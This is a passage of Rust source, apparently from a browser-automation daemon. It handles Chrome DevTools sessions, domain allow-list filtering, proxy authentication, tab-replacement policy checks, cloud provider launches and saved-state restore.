        .is_some_and(|filter| !filter.allowed_domains.is_empty())
    {
        return Err(format!(
            "--allowed-domains is not supported with {} because loading state replays saved origins",
            source
        ));
    }
    Ok(())
}

async fn restore_domain_filter(state: &mut DaemonState, filter: &Option<DomainFilter>) {
    let mut current = state.domain_filter.write().await;
    *current = filter.clone();
}

fn chrome_switch_name(arg: &str) -> Option<&str> {
    let trimmed = arg.trim();
    trimmed
        .strip_prefix("--")
        .or_else(|| trimmed.strip_prefix('/'))
        .or_else(|| trimmed.strip_prefix('-'))
        .and_then(|switch| switch.split(['=', ' ']).next())
        .filter(|name| !name.is_empty() && !name.contains(['/', '\\']))
}

fn is_startup_url_arg(arg: &str) -> bool {
    let trimmed = arg.trim().to_ascii_lowercase();
    trimmed.starts_with("http://")
        || trimmed.starts_with("https://")
        || trimmed.starts_with("file://")
}

fn is_positional_chrome_arg(arg: &str) -> bool {
    !arg.trim().is_empty() && chrome_switch_name(arg).is_none()
}

/// Raw Chrome args can select an existing profile or open startup pages before
/// CDP interception and init scripts are installed.
fn allowed_domains_disallowed_chrome_arg(args: &[String]) -> Option<&'static str> {
    for arg in args {
        if is_startup_url_arg(arg) {
            return Some("a startup URL");
        }
        if is_positional_chrome_arg(arg) {
            return Some("a startup URL or path");
        }
        let Some(name) = chrome_switch_name(arg) else {
            continue;
        };
        let lower = name.to_ascii_lowercase();
        match lower.as_str() {
            "user-data-dir" => return Some("--user-data-dir"),
            "profile-directory" => return Some("--profile-directory"),
            "restore-last-session" => return Some("--restore-last-session"),
            "restore-session" => return Some("--restore-session"),
            "app" => return Some("--app"),
            "app-id" => return Some("--app-id"),
            "app-launch-url-for-shortcuts-menu-item" => {
                return Some("--app-launch-url-for-shortcuts-menu-item")
            }
            "load-and-launch-app" => return Some("--load-and-launch-app"),
            _ => {}
        }
    }

    None
}

/// Upper bound for preparing an iframe, worker, or page session that the
/// event drain or auto-attach reported. Every command drains CDP events
/// first, so this setup runs on the command path: a session that neither
/// answers nor reports its detach would otherwise hold every queued command
/// for the 30 s CDP timeout of each command it sends.
const AUTO_ATTACHED_SETUP_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(10);

/// `kind` and `id` name what is being prepared in the timeout error, e.g.
/// `"session"` and a session id, or `"target"` and a target id when the
/// session does not exist yet.
async fn bounded_auto_attached_setup(
    kind: &str,
    id: &str,
    setup: impl std::future::Future<Output = Result<(), String>>,
) -> Result<(), String> {
    tokio::time::timeout(AUTO_ATTACHED_SETUP_TIMEOUT, setup)
        .await
        .unwrap_or_else(|_| Err(format!("Timed out preparing auto-attached {} {}", kind, id)))
}

/// What the background handler did with a session that auto-attach reported.
#[derive(Debug, PartialEq, Eq)]
enum AutoAttachedSetup {
    /// Controls (if any) are installed and the target was resumed.
    Resumed,
    /// The session detached during setup; its target is gone.
    Detached,
    /// Setup failed; the target stays paused so it cannot run uncontrolled.
    Failed,
}

/// Installs network controls on a session that browser-level auto-attach
/// reported, then resumes it. This runs in the background handler that also
/// answers `Fetch.requestPaused` for the page, so a dead child session must
/// not stall it.
async fn setup_auto_attached_session(
    client: &CdpClient,
    sid: &str,
    target_info: Option<&TargetInfo>,
    waiting_for_debugger: bool,
    domain_filter: Option<&DomainFilter>,
    has_proxy_creds: bool,
) -> AutoAttachedSetup {
    let target_needs_controls = target_info.is_some_and(target_supports_network_controls);
    let controls_active = domain_filter.is_some() || has_proxy_creds;
    let controls_result = match target_info {
        Some(target) if controls_active && target_needs_controls => {
            bounded_auto_attached_setup("session", sid, async {
                prepare_network_control_target_session(client, sid, target).await?;
                if target_is_worker_like(target) {
                    install_worker_network_controls_for_session(
                        client,
                        sid,
                        domain_filter,
                        has_proxy_creds,
                        target,
                    )
                    .await
                } else {
                    install_network_controls_for_session(
                        client,
                        sid,
                        domain_filter,
                        has_proxy_creds,
                        waiting_for_debugger,
                    )
                    .await
                }
            })
            .await
        }
        _ => Ok(()),
    };

    match controls_result {
        Ok(()) => {
            let _ = client
                .send_command_no_wait("Runtime.runIfWaitingForDebugger", None, Some(sid))
                .await;
            AutoAttachedSetup::Resumed
        }
        Err(error) if is_session_detached_error(&error) => {
            log_detached_during_setup("auto-attached", &error);
            AutoAttachedSetup::Detached
        }
        Err(error) => {
            eprintln!(
                "Failed to apply browser network controls to auto-attached target: {}",
                error
            );
            AutoAttachedSetup::Failed
        }
    }
}

/// An auto-attached session that detached during setup took its target with
/// it, so there is nothing left to control or resume. Short-lived iframes do
/// this routinely; it is not worth a warning.
fn log_detached_during_setup(kind: &str, error: &str) {
    if env::var_os("AGENT_BROWSER_DEBUG").is_some() {
        let _ = writeln!(
            std::io::stderr(),
            "[cdp] {} session detached during setup: {}",
            kind,
            error
        );
    }
}

async fn prepare_auto_attached_session(client: &CdpClient, session_id: &str) -> Result<(), String> {
    client
        .send_command_no_params("Page.enable", Some(session_id))
        .await?;
    client
        .send_command_no_params("Runtime.enable", Some(session_id))
        .await?;
    client
        .send_command_no_params("Network.enable", Some(session_id))
        .await?;
    let _ = client
        .send_command(
            "Target.setAutoAttach",
            Some(json!({
                "autoAttach": true,
                "waitForDebuggerOnStart": true,
                "flatten": true
            })),
            Some(session_id),
        )
        .await;
    Ok(())
}

fn target_is_worker_like(target: &TargetInfo) -> bool {
    matches!(
        target.target_type.as_str(),
        "worker" | "service_worker" | "shared_worker"
    )
}

fn target_supports_worker_fetch_controls(target: &TargetInfo) -> bool {
    target.target_type == "service_worker"
}

fn target_supports_network_controls(target: &TargetInfo) -> bool {
    target.target_type == "iframe" || should_track_target(target) || target_is_worker_like(target)
}

async fn prepare_network_control_target_session(
    client: &CdpClient,
    session_id: &str,
    target: &TargetInfo,
) -> Result<(), String> {
    if target_is_worker_like(target) {
        Ok(())
    } else {
        prepare_auto_attached_session(client, session_id).await
    }
}

async fn install_network_controls_for_session(
    client: &CdpClient,
    session_id: &str,
    filter: Option<&DomainFilter>,
    handle_auth_requests: bool,
    paused_before_document: bool,
) -> Result<(), String> {
    if let Some(filter) = filter {
        network::install_domain_filter(
            client,
            session_id,
            &filter.allowed_domains,
            handle_auth_requests,
            paused_before_document,
        )
        .await?;
    } else if handle_auth_requests {
        network::install_domain_filter_fetch(client, session_id, true).await?;
    }

    Ok(())
}

async fn install_worker_network_controls_for_session(
    client: &CdpClient,
    session_id: &str,
    filter: Option<&DomainFilter>,
    handle_auth_requests: bool,
    target: &TargetInfo,
) -> Result<(), String> {
    if filter.is_some() {
        if target_supports_worker_fetch_controls(target) {
            network::install_domain_filter_fetch(client, session_id, handle_auth_requests).await?;
        }
    } else if handle_auth_requests && target_supports_worker_fetch_controls(target) {
        network::install_domain_filter_fetch(client, session_id, true).await?;
    }

    Ok(())
}

async fn install_active_network_controls(
    state: &mut DaemonState,
    handle_auth_requests: bool,
) -> Result<(), String> {
    let filter = state.domain_filter.read().await.clone();
    if !network_controls_required(filter.as_ref(), handle_auth_requests) {
        return Ok(());
    }

    let direct_page = {
        let mgr = state
            .browser
            .as_ref()
            .ok_or("Browser is not available for network control installation")?;
        mgr.is_direct_page_connection()
    };
    if direct_page && filter.is_some() {
        return Err(direct_page_allowed_domains_error());
    }

    if !state.network_auto_attach_installed && !direct_page {
        {
            let mgr = state
                .browser
                .as_ref()
                .ok_or("Browser is not available for network control installation")?;
            mgr.enable_browser_auto_attach_pub().await?;
        }
        state.network_auto_attach_installed = true;
    }

    let mgr = state
        .browser
        .as_ref()
        .ok_or("Browser is not available for network control installation")?;
    let session_ids = network_control_session_ids(mgr)?;

    for session_id in session_ids {
        mgr.prepare_domains_pub(&session_id).await?;
        install_network_controls_for_session(
            &mgr.client,
            &session_id,
            filter.as_ref(),
            handle_auth_requests,
            false,
        )
        .await?;
        mgr.resume_if_waiting_pub(&session_id).await?;
    }

    if let Some(ref filter) = filter {
        network::sanitize_existing_pages(&mgr.client, &mgr.pages_list(), filter).await;
    }

    Ok(())
}

/// The wedged tab was replaced by a blank one: drop the old tab's refs and
/// frame scope, and give the new tab the session setup and network controls
/// (headers, routes, domain filter) that `tab new` installs.
async fn adopt_replacement_tab(
    state: &mut DaemonState,
    old_session_id: &str,
) -> Result<(), String> {
    state.webmcp.clear_page_scope(old_session_id);
    state.webmcp.observations.remove(old_session_id);
    state.ref_map.begin_snapshot();
    state.active_iframe_sessions.clear();
    state.active_frame_id = None;
    state.webmcp.clear_invocations();
    let session_id = state
        .browser
        .as_ref()
        .ok_or("Browser not launched")?
        .active_session_id()?
        .to_string();
    let has_proxy_creds = state.proxy_credentials.read().await.is_some();
    apply_session_setup(state, &session_id).await?;
    install_network_controls_or_close(state, has_proxy_creds).await?;
    state.drain_cdp_events_background().await?;
    state.refresh_active_iframe_sessions().await;
    Ok(())
}

/// Replacing a wedged tab opens one tab and closes another, so it runs only
/// when policy would let the agent do both itself without a confirmation.
fn may_replace_wedged_tab(state: &DaemonState) -> bool {
    ["tab_new", "tab_close"].iter().all(|action| {
        let confirmed = state.confirmed_policy_actions.contains(*action);
        let policy_ok = state
            .policy
            .as_ref()
            .is_none_or(|policy| match policy.check(action) {
                PolicyResult::Allow => true,
                PolicyResult::RequiresConfirmation => confirmed,
                PolicyResult::Deny(_) => false,
            });
        let category_ok = confirmed
            || !state
                .confirm_actions
                .as_ref()
                .is_some_and(|ca| ca.requires_confirmation(action));
        policy_ok && category_ok
    })
}

/// Add to the response's warning instead of replacing one already set.
fn append_warning(resp: &mut Value, warning: &str) {
    let merged = match resp.get("warning").and_then(Value::as_str) {
        Some(existing) => format!("{}\n{}", existing, warning),
        None => warning.to_string(),
    };
    resp["warning"] = json!(merged);
}

async fn install_network_controls_or_close(
    state: &mut DaemonState,
    handle_auth_requests: bool,
) -> Result<(), String> {
    if let Err(error) = install_active_network_controls(state, handle_auth_requests).await {
        return close_after_network_control_failure(state, error).await;
    }
    Ok(())
}

async fn install_network_controls_or_resume_prepared_session(
    state: &mut DaemonState,
    handle_auth_requests: bool,
    session_id: &str,
) -> Result<(), String> {
    let filter = state.domain_filter.read().await.clone();
    if network_controls_required(filter.as_ref(), handle_auth_requests) {
        install_network_controls_or_close(state, handle_auth_requests).await
    } else {
        let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
        mgr.resume_if_waiting_pub(session_id).await
    }
}

const BROWSER_USE_SETUP_DEADLINE: std::time::Duration = std::time::Duration::from_secs(18);

async fn browser_use_setup_timeout(state: &mut DaemonState) -> String {
    let message = "Browser Use setup timed out; inspect Browser Use Cloud before retrying";
    match tokio::time::timeout(
        std::time::Duration::from_secs(4),
        close_current_browser(state),
    )
    .await
    {
        Ok(Ok(())) => message.to_string(),
        Ok(Err(error)) => combine_provider_failure(message.to_string(), Some(error)),
        Err(_) => {
            let recovery = state
                .active_provider_session
                .as_ref()
                .and_then(|active| {
                    (active.session.provider == "browser-use")
                        .then(|| uuid::Uuid::parse_str(&active.session.session_id).ok())
                        .flatten()
                })
                .map(|id| {
                    format!(
                        "; browser {} remains pending; retry close or stop it in Browser Use Cloud",
                        id
                    )
                })
                .unwrap_or_default();
            format!("{}; cleanup timed out{}", message, recovery)
        }
    }
}

/// True when [`apply_session_setup`] has anything to replay onto a new tab.
async fn session_setup_pending(state: &DaemonState) -> bool {
    !state.session_setup.is_empty()
        || !state.routes.read().await.is_empty()
        || !state.origin_headers.read().await.is_empty()
}

/// Replay the session-scoped setup the user configured on the active page
/// (see [`SessionSetup`]) onto a tab the daemon just created, plus the
/// `Fetch.enable` needed for `route` and origin-scoped `--headers` to reach
/// the shared fetch handler from that tab.
///
/// Call after `Page`/`Network` are enabled on `session_id` and before its
/// first navigation, so init scripts, UA, and headers cover the initial
/// document. Emulation failures are ignored: a call the engine rejects
/// should not abort creating the tab.
async fn apply_session_setup(state: &mut DaemonState, session_id: &str) -> Result<(), String> {
    let client = state
        .browser
        .as_ref()
        .ok_or("Browser not launched")?
        .client
        .clone();
    let setup = state.session_setup.clone();

    if let Some(ref ua) = setup.user_agent {
        let _ = client
            .send_command(
                "Emulation.setUserAgentOverride",
                Some(json!({ "userAgent": ua })),
                Some(session_id),
            )
            .await;
    }

    if let Some(ref emulated) = setup.emulated_media {
        let mut params = json!({});
        if let Some(ref m) = emulated.media {
            params["media"] = Value::String(m.clone());
        }
        if !emulated.features.is_empty() {
            params["features"] = Value::Array(
                emulated
                    .features
                    .iter()
                    .map(|(name, value)| json!({ "name": name, "value": value }))
                    .collect(),
            );
        }
        let _ = client
            .send_command("Emulation.setEmulatedMedia", Some(params), Some(session_id))
            .await;
    }

    if let Some(ref tz) = setup.timezone {
        let _ = client
            .send_command(
                "Emulation.setTimezoneOverride",
                Some(json!({ "timezoneId": tz })),
                Some(session_id),
            )
            .await;
    }

    if let Some(ref locale) = setup.locale {
        let _ = client
            .send_command(
                "Emulation.setLocaleOverride",
                Some(json!({ "locale": locale })),
                Some(session_id),
            )
            .await;
    }

    if let Some((lat, lon, accuracy)) = setup.geolocation {
        let _ = client
            .send_command(
                "Emulation.setGeolocationOverride",
                Some(json!({
                    "latitude": lat,
                    "longitude": lon,
                    "accuracy": accuracy.unwrap_or(1.0),
                })),
                Some(session_id),
            )
            .await;
    }

    if let Some(ref headers) = setup.extra_headers {
        network::set_extra_headers(&client, session_id, headers).await?;
    }

    if let Some(offline) = setup.offline {
        network::set_offline(&client, session_id, offline).await?;
    }

    for (index, script) in setup.init_scripts.iter().enumerate() {
        let result = client
            .send_command(
                "Page.addScriptToEvaluateOnNewDocument",
                Some(json!({ "source": &script.source })),
                Some(session_id),
            )
            .await?;
        let identifier = result
            .get("identifier")
            .and_then(Value::as_str)
            .ok_or("Page.addScriptToEvaluateOnNewDocument returned no identifier")?;
        let tracked = state
            .session_setup
            .init_scripts
            .get_mut(index)
            .ok_or("Init script setup changed while it was being applied")?;
        tracked
            .session_identifiers
            .insert(session_id.to_string(), identifier.to_string());
    }

    // `route` and origin-scoped `--headers` are resolved by the background
    // fetch handler for any session, but only sessions with Fetch enabled
    // emit requestPaused. Domain filtering and proxy auth install their own
    // Fetch.enable; this covers the case where neither is active.
    let has_routes = !state.routes.read().await.is_empty();
    let has_origin_headers = !state.origin_headers.read().await.is_empty();
    if has_routes || has_origin_headers {
        let patterns = build_fetch_patterns(state).await;
        let params = build_fetch_enable_params(state, patterns).await;
        client
            .send_command("Fetch.enable", Some(params), Some(session_id))
            .await?;
    }

    Ok(())
}

async fn auto_launch(
    state: &mut DaemonState,
    plugins: Vec<crate::plugins::PluginConfig>,
) -> Result<Value, String> {
    auto_launch_with(state, plugins, &Value::Null, false).await
}

/// Launches or attaches the session's browser from its settings. `cmd` is the
/// launch command that asked for it, when there is one; it carries only what
/// the settings do not (device selection for the WebDriver providers).
///
/// `strict_state` is set when the command named a `--state` file: a file that
/// cannot be loaded then fails the launch instead of launching without state.
async fn auto_launch_with(
    state: &mut DaemonState,
    plugins: Vec<crate::plugins::PluginConfig>,
    cmd: &Value,
    strict_state: bool,
) -> Result<Value, String> {
    if state.attached_target.is_some() && cmd.is_null() {
        // Resume the attached browser; the launch handler resolves the target.
        let launch = json!({ "action": "launch", "plugins": plugins });
        return Box::pin(handle_launch(&launch, state)).await;
    }
    let connection = state.settings.connection();
    if matches!(connection, Connection::Cdp(_) | Connection::AutoConnect)
        || !matches!(&connection, Connection::Provider(provider) if provider_is_browser_use(provider))
    {
        return auto_launch_inner(state, plugins, cmd, strict_state).await;
    }
    let credentials = state.proxy_credentials.read().await.clone();
    let scripts = state.plugin_init_scripts.clone();
    let setup = state.session_setup.clone();
    let result = match tokio::time::timeout(
        BROWSER_USE_SETUP_DEADLINE,
        auto_launch_inner(state, plugins, cmd, strict_state),
    )
    .await
    {
        Ok(result) => result,
        Err(_) => Err(browser_use_setup_timeout(state).await),
    };
    if result.is_err() {
        *state.proxy_credentials.write().await = credentials;
        state.plugin_init_scripts = scripts;
        state.session_setup = setup;
    }
    result
}

async fn auto_launch_inner(
    state: &mut DaemonState,
    plugins: Vec<crate::plugins::PluginConfig>,
    cmd: &Value,
    strict_state: bool,
) -> Result<Value, String> {
    if has_active_browser_session(state) {
        close_before_implicit_relaunch(state).await?;
    }
    let mut options = state.settings.launch_options();
    let effective_ca_cert = state.effective_ca_cert.clone();
    apply_effective_ca_cert(&mut options, &effective_ca_cert);
    state.plugin_init_scripts.clear();
    state.session_setup = SessionSetup::default();

    // Use the stream server's viewport dimensions for --window-size so the
    // content area matches the desired viewport from the start.
    if let Some(ref server) = state.stream_server {
        options.viewport_size = Some(server.viewport().await);
    }
    let engine = state.settings.engine();
    let connection = state.settings.connection();
    let cdp = match &connection {
        Connection::Cdp(cdp) => Some(cdp.clone()),
        _ => None,
    };
    let auto_connect = matches!(connection, Connection::AutoConnect);
    let provider = match &connection {
        Connection::Provider(provider) => Some(provider.clone()),
        _ => None,
    };
    validate_ca_cert_launch_mode(
        &options,
        engine.as_deref(),
        !matches!(connection, Connection::Local),
    )?;
    let enable_features = state.settings.enable_features();
    let init_script_paths = state.settings.init_scripts();
    let allowed_domains = current_allowed_domains(state).await;
    options.restrict_webrtc = !allowed_domains.is_empty();
    // Extract storage_state before options is moved into BrowserManager::launch.
    let storage_state_path = options.storage_state.clone();
    let restore_key = state.session_name.clone();

    // Store proxy credentials for Fetch.authRequired handling
    // Only a browser agent-browser launches itself gets them: an external
    // browser is never answered proxy challenges on the session's behalf.
    let local = matches!(connection, Connection::Local);
    let has_proxy_auth = local && options.proxy_username.is_some();
    if has_proxy_auth {
        let mut creds = state.proxy_credentials.write().await;
        *creds = Some((
            options.proxy_username.clone().unwrap_or_default(),
            options.proxy_password.clone().unwrap_or_default(),
        ));
    } else if !local {
        *state.proxy_credentials.write().await = None;
    }
    // Nor is a state file replayed into one.
    let storage_state_path = if local { storage_state_path } else { None };
    let storage_state = storage_state_path.as_deref();

    // An attached browser is whatever it is: an inherited engine name would
    // mislabel it, so only a local launch or a provider reads the engine.
    let engine = if matches!(connection, Connection::Cdp(_) | Connection::AutoConnect) {
        None
    } else {
        engine
    };
    state.engine = engine.as_deref().unwrap_or("chrome").to_string();
    write_engine_file(&state.session_id, &state.engine);
    write_extensions_file(&state.session_id, &state.settings);

    if let Some(cdp) = cdp {
        ensure_allowed_domains_supported_for_launch(AllowedDomainsLaunchSupport {
            allowed_domains: &allowed_domains,
            cdp_url: Some(cdp.as_str()),
            cdp_port: None,
            auto_connect: false,
            profile: options.profile.as_deref(),
            provider_name: None,
            args: &options.args,
            restore_key: restore_key.as_deref(),
            storage_state,
        })?;
        let headers =
            cdp_headers_for(state, &cdp).or_else(|| cdp_headers_from_settings(&state.settings));
        let mgr = BrowserManager::connect_cdp_when_listening(&cdp, headers.clone()).await?;
        state.cdp_headers = headers.map(|headers| (cdp.clone(), headers));
        state.reset_input_state();
        state.browser = Some(mgr);
        state.launch_identity = Some(state.settings.launch_identity());
        state.subscribe_to_browser_events();
        state.start_fetch_handler();
        state.start_dialog_handler();
        apply_tab_binding_on_attach_or_rollback(state).await?;
        state.update_stream_client().await;
        install_network_controls_or_close(state, has_proxy_auth).await?;
        apply_launch_init_scripts(state, &enable_features, &init_script_paths).await;
        try_auto_restore_state(state).await;
        load_storage_state_for_launch(state, &storage_state_path, strict_state).await?;
        return Ok(json!({}));
    }

    if auto_connect {
        ensure_allowed_domains_supported_for_launch(AllowedDomainsLaunchSupport {
            allowed_domains: &allowed_domains,
            cdp_url: None,
            cdp_port: None,
            auto_connect: true,
            profile: options.profile.as_deref(),
            provider_name: None,
            args: &options.args,
            restore_key: restore_key.as_deref(),
            storage_state,
        })?;
        state.reset_input_state();
        state.browser = Some(BrowserManager::connect_auto().await?);
        if !apply_tab_binding_on_attach_or_rollback(state).await? {
            if let Err(e) = open_fresh_tab_for_auto_connect(state).await {
                let _ = rollback_failed_launch(state).await;
                return Err(e);
            }
        }
        state.launch_identity = Some(state.settings.launch_identity());
        state.subscribe_to_browser_events();
        state.start_fetch_handler();
        state.start_dialog_handler();
        state.update_stream_client().await;
        install_network_controls_or_close(state, has_proxy_auth).await?;
        apply_launch_init_scripts(state, &enable_features, &init_script_paths).await;
        try_auto_restore_state(state).await;
        load_storage_state_for_launch(state, &storage_state_path, strict_state).await?;
        return Ok(json!({}));
    }

    // Cloud provider: when the session's settings name a provider, connect via
    // the provider API instead of launching a local Chrome instance, so a
    // command that arrives before an explicit "launch" uses it too.
    if let Some(provider) = provider {
        let p = provider.to_lowercase();
        ensure_allowed_domains_supported_for_launch(AllowedDomainsLaunchSupport {
            allowed_domains: &allowed_domains,
            cdp_url: None,
            cdp_port: None,
            auto_connect: false,
            profile: options.profile.as_deref(),
            provider_name: Some(p.as_str()),
            args: &options.args,
            restore_key: restore_key.as_deref(),
            storage_state,
        })?;
        // ios and safari are WebDriver-backed device providers.
        if p == "ios" {
            // A relaunch keeps the device the session was set up with.
            let mut ios_cmd = if cmd.is_object() {
                cmd.clone()
            } else {
                json!({})
            };
            if ios_cmd.get("deviceName").is_none() {
                if let Some(device) = state.settings.get(Key::Device).and_then(Value::as_str) {
                    ios_cmd["deviceName"] = json!(device);
                }
            }
            let result = launch_ios(&ios_cmd, state).await;
            if result.is_ok() {
                state.effective_ca_cert = effective_ca_cert;
            }
            return result;
        }
        if p == "safari" {
            let result = launch_safari(cmd, state).await;
            if result.is_ok() {
                state.effective_ca_cert = effective_ca_cert;
            }
            return result;
        }
        if !p.is_empty() {
            let conn =
                providers::connect_provider_with_plugins(&p, &plugins, &state.settings).await?;
            let provider_metadata = conn.metadata.clone();
            if conn.direct_page && !allowed_domains.is_empty() {
                if let Some(ref ps) = conn.session {
                    let _ = providers::close_provider_session_with_plugins(ps, &plugins).await;
                }
                return Err(direct_page_allowed_domains_error());
            }
            let ws_headers = if p == "agentcore" {
                providers::take_agentcore_ws_headers()
            } else {
                None
            };
            match attach_provider_cdp(&p, &conn, ws_headers, state, &plugins).await {
                Ok(mgr) => {
                    state.reset_input_state();
                    state.browser = Some(mgr);
                    state.launch_identity = Some(state.settings.launch_identity());
                    state.subscribe_to_browser_events();
                    state.start_fetch_handler();
                    state.start_dialog_handler();
                    state.update_stream_client().await;
                    write_provider_file(&state.session_id, &p);
                    install_network_controls_or_close(state, has_proxy_auth).await?;
                    apply_launch_init_scripts(state, &enable_features, &init_script_paths).await;
                    try_auto_restore_state(state).await;
                    load_storage_state_for_launch(state, &storage_state_path, strict_state).await?;
                    state.effective_ca_cert = effective_ca_cert;
                    let mut extras = json!({ "provider": provider });
                    if let Some(info) = providers::get_agentcore_info() {
                        extras["agentCoreSessionId"] = json!(info.session_id);
                        extras["agentCoreLiveViewUrl"] = json!(info.live_view_url);
                    } else if let Some(metadata) = provider_metadata {
                        extras["providerMetadata"] = metadata;
                    }
                    return Ok(extras);
                }
                Err(e) => {
                    let cleanup_error = close_active_provider_session(state).await.err();
                    return Err(combine_provider_failure(
                        format!("Provider '{}' connection failed: {}", p, e),
                        cleanup_error,
                    ));
                }
            }
        }
    }

    ensure_allowed_domains_supported_for_launch(AllowedDomainsLaunchSupport {
        allowed_domains: &allowed_domains,
        cdp_url: None,
        cdp_port: None,
        auto_connect: false,
        profile: options.profile.as_deref(),
        provider_name: None,
        args: &options.args,
        restore_key: restore_key.as_deref(),
        storage_state,
    })?;

    apply_launch_mutator_plugins(state, &mut options, plugins).await?;
    validate_ca_cert_launch_mode(&options, engine.as_deref(), false)?;
    ensure_allowed_domains_supported_for_launch(AllowedDomainsLaunchSupport {
        allowed_domains: &allowed_domains,
        cdp_url: None,
        cdp_port: None,
        auto_connect: false,
        profile: options.profile.as_deref(),
        provider_name: None,
        args: &options.args,
        restore_key: restore_key.as_deref(),
        storage_state,
    })?;
    write_extensions_file_from_paths(
        &state.session_id,
        &state.settings,
        options.extensions.as_deref(),
    );
    if let Some(ref ca) = effective_ca_cert {
        options.prepared_nss_home = Some(prepare_nss_home(&ca.bundle)?);
    }
    state.session_setup = SessionSetup::from_launch_options(&options);
    let mgr = BrowserManager::launch(options, engine.as_deref()).await?;
    state.reset_input_state();
    state.browser = Some(mgr);
    state.launch_identity = Some(state.settings.launch_identity());
    state.effective_ca_cert = effective_ca_cert;
    state.subscribe_to_browser_events();
    state.start_fetch_handler();
    state.start_dialog_handler();
    state.update_stream_client().await;
    install_network_controls_or_close(state, has_proxy_auth).await?;

    apply_launch_init_scripts(state, &enable_features, &init_script_paths).await;
    try_auto_restore_state(state).await;
    load_storage_state_for_launch(state, &storage_state_path, strict_state).await?;
    Ok(json!({}))
}

fn string_array_from_command(cmd: &Value, key: &str) -> Option<Vec<String>> {
    cmd.get(key).and_then(|v| v.as_array()).map(|arr| {
        arr.iter()
            .filter_map(|v| v.as_str().map(|s| s.to_string()))
            .collect()
    })
}

fn allowed_domains_from_launch_command(cmd: &Value) -> Option<Vec<String>> {
    let value = cmd.get("allowedDomains")?;
    let raw_domains: Vec<&str> = match value {
        Value::String(domains) => domains.split(',').collect(),
        Value::Array(domains) => domains.iter().filter_map(Value::as_str).collect(),
        _ => Vec::new(),
    };
    Some(
        raw_domains
            .into_iter()
            .map(|domain| domain.trim().to_lowercase())
            .filter(|domain| !domain.is_empty())
            .collect(),
    )
}

async fn apply_launch_init_scripts(
    state: &mut DaemonState,
    enable_features: &[String],
    init_script_paths: &[String],
) {
    let mut sources: Vec<String> = Vec::new();

    for feature in enable_features {
        match feature.as_str() {
            "react-devtools" | "react" => {
                sources.push(react::INSTALL_HOOK_JS.to_string());
            }
            other => {
                eprintln!("warning: unknown --enable feature '{}'", other);
            }
        }
    }

    for path in init_script_paths {
        match fs::read_to_string(path) {
            Ok(source) => sources.push(source),
            Err(e) => {
                eprintln!("warning: failed to read --init-script '{}': {}", path, e);
            }
        }
    }

    sources.extend(state.plugin_init_scripts.iter().cloned());

    let Some(mgr) = state.browser.as_ref() else {
        return;
    };
    let Ok(session_id) = mgr.active_session_id().map(str::to_string) else {
        return;
    };

    let mut registered = Vec::with_capacity(sources.len());
    for source in sources {
        let session_identifier = mgr
            .add_script_to_evaluate(&source)
            .await
            .unwrap_or_default();
        registered.push((source, session_identifier));
    }
    for (source, session_identifier) in registered {
        state
            .session_setup
            .register_init_script(source, session_id.clone(), session_identifier);
    }
}

async fn apply_launch_mutator_plugins(
    state: &mut DaemonState,
    options: &mut LaunchOptions,
    plugins: Vec<crate::plugins::PluginConfig>,
) -> Result<(), String> {
    state.plugin_init_scripts.clear();
    if plugins.is_empty() {
        return Ok(());
    }

    let request = json!({
        "session": state.session_id,
        "launchOptions": {
            "headless": options.headless,
            "engine": state.settings.engine().unwrap_or_else(|| "chrome".to_string()),
            "args": options.args.clone(),
            "extensions": options.extensions.clone(),
            "userAgent": options.user_agent.clone(),
            "colorScheme": options.color_scheme.clone(),
            "downloadPath": options.download_path.clone(),
            "hideScrollbars": options.hide_scrollbars,
            "allowFileAccess": options.allow_file_access,
            "webgpu": options.webgpu,
            "noXvfb": options.no_xvfb,
        }
    });

    for mutation in crate::plugins::launch_mutations_from_plugins(&plugins, request).await? {
        options.args.extend(mutation.args);
        if !mutation.extensions.is_empty() {
            options
                .extensions
                .get_or_insert_with(Vec::new)
                .extend(mutation.extensions);
        }
        if let Some(user_agent) = mutation.user_agent {
            options.user_agent = Some(user_agent);
        }
        state.plugin_init_scripts.extend(mutation.init_scripts);
    }

    Ok(())
}

async fn try_auto_restore_state(state: &mut DaemonState) {
    state.restore_skipped_origins.clear();
    let session_name = match state.session_name.as_deref() {
        Some(n) if !n.is_empty() => n.to_string(),
        _ => {
            state.restore_status = "not_configured".to_string();
            state.restore_status_detail = None;
            state.restore_loaded_path = None;
            state.restore_load_failed = false;
            state.restore_validation_pending = false;
            return;
        }
    };
    if let Some(path) = state::find_auto_state_file(&session_name) {
        if let Some(ref mgr) = state.browser {
            if let Ok(session_id) = mgr.active_session_id() {
                match state::load_state(&mgr.client, session_id, &path).await {
                    Ok(skipped) => {
                        state.restore_status = "loaded".to_string();
                        state.restore_status_detail = None;
                        state.restore_skipped_origins = skipped;
                        state.restore_loaded_path = Some(path.clone());
                        state.restore_load_failed = false;
                        state.restore_validation_pending = state.restore_check_url.is_some()
                            || state.restore_check_text.is_some()
                            || state.restore_check_fn.is_some();
                    }
                    Err(err) => {
                        state.restore_status = "load_failed".to_string();
                        state.restore_status_detail = Some(err);
                        state.restore_loaded_path = Some(path);
                        state.restore_load_failed = true;
                        state.restore_validation_pending = false;
                    }
                }
            }
        }
    } else {
        state.restore_status = "missing".to_string();
        state.restore_status_detail = None;
        state.restore_loaded_path = None;
        state.restore_load_failed = false;
        state.restore_validation_pending = false;
    }
}

async fn validate_restore_if_pending(state: &mut DaemonState) {
    if !state.restore_validation_pending {
        return;
    }
    state.restore_validation_pending = false;

    match validate_restored_state(state).await {
        Ok(()) => {
            state.restore_status = "loaded".to_string();
            state.restore_status_detail = None;
            state.restore_load_failed = false;
        }
        Err(err) => {
            state.restore_status = "loaded_but_invalid".to_string();
            state.restore_status_detail = Some(err);
            state.restore_load_failed = true;
        }
    }
}

async fn validate_restored_state(state: &DaemonState) -> Result<(), String> {
    let Some(ref mgr) = state.browser else {
        return Ok(());
    };
    let session_id = mgr.active_session_id()?.to_string();
    let timeout_ms = state.default_timeout_ms.min(2_000);

    if let Some(ref pattern) = state.restore_check_url {
        let url = mgr.get_url().await.unwrap_or_default();
        if !route_url_matches(pattern, &url) {
            return Err(format!(
                "restore URL validation failed: '{}' did not match '{}'",
                url, pattern
            ));
        }
    }

    if let Some(ref text) = state.restore_check_text {
        wait_for_text(&mgr.client, &session_id, text, timeout_ms).await?;
    }

    if let Some(ref expression) = state.restore_check_fn {
        wait_for_function(&mgr.client, &session_id, expression, timeout_ms).await?;
    }

    Ok(())
}

fn mark_explicit_storage_state_loaded(state: &mut DaemonState, path: &str) {
    if state.session_name.is_none() && state.restore_status == "not_configured" {
